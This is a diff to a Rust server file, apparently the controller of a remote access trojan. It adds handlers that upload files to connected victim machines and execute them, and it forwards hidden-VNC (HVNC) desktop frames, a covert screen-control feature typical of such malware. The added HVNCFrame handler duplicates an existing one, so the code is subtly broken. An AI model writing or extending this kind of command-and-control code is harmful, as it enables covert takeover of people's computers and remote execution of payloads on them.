@@ -367,6 +367,35 @@ impl ServerWrapper {
                         .await
                 }
 
+                UploadAndExecute(addr, file_data) => {
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.username)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::UploadAndExecute(file_data)).await;
+                    }
+                },
+                
+                ExecuteFile(addr, path) => {
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.username)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path)).await;
+                    }
+                },
+                
+                UploadFile(addr, target_folder, file_data) => {
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.username)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::UploadFile(target_folder, file_data)).await;
+                    }
+                },
+
+                HVNCFrame(addr, data) => {
+                    println!("HVNCFrame received from {}", addr);
+                    self.emit_serde_payload("hvnc_frame", serde_json::json!({
+                        "addr": addr.to_string(),
+                        "data": general_purpose::STANDARD.encode(&data)
+                    })).await;
+                },
+
                 HVNCFrame(addr, data) => {
                     println!("HVNCFrame received from {}", addr);
                     self.emit_serde_payload(
